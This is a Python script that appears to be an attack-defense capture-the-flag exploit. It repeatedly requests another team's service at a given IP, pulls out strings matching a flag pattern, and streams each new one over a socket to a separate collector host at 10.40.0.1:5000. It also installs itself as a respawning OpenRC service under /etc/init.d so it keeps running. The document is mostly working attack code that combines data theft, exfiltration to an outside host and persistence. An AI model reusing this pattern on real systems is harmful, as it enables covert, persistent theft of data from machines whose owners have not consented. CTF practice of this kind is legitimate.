#!/usr/bin/env python3

import subprocess
import os
import json
import time
import socket
import requests
import re


def run_exploit(teamIp, sleepFloat):
    # Dial 10.40.0.1 port 5000
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("10.40.0.1", 5000))

    flag_regex = re.compile(r"flag\{.*\}")

    flag_set = set()

    while True:
        # request the homepage of the service
        response = requests.get(f"http://{teamIp}:5000/")

        # Find all instances of the flag
        flags = flag_regex.findall(response.text)

        # Send the flags to the dialer if they are not already in the set
        for flag in flags:
            if flag not in flag_set:
                flag_set.add(flag)
                s.sendall(flag.encode() + b"\n")

        time.sleep(sleepFloat)


def main(args):
    if len(args) == 0:
        with open("/root/exploit.json", "r") as f:
            data = json.load(f)
            teamIp = data["teamIp"]
            sleepFloat = data["sleepFloat"]
            return run_exploit(teamIp, sleepFloat)

    teamIp, sleepFloat = args
    sleepFloat = float(sleepFloat)

    with open("/root/exploit.json", "w") as f:
        json.dump({"teamIp": teamIp, "sleepFloat": sleepFloat}, f)

    with open("/etc/init.d/exploit", "w") as f:
        f.write(
            """#!/sbin/openrc-run
command="/usr/bin/python3"
command_args="/root/exploit1.py"
command_background="yes"
pidfile="/run/exploit.pid"
respawn="yes"
respawn_delay="5"
# Set the working directory to the directory of the script
directory="/root"
"""
        )

    os.chmod("/etc/init.d/exploit", 0o755)

    subprocess.check_call(
        ["service", "exploit", "start"],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )

    response = subprocess.run(["service", "exploit", "status"])
    if response.returncode != 0:
        raise Exception("Service failed to start")


if __name__ == "__main__":
    import sys

    main(sys.argv[1:])
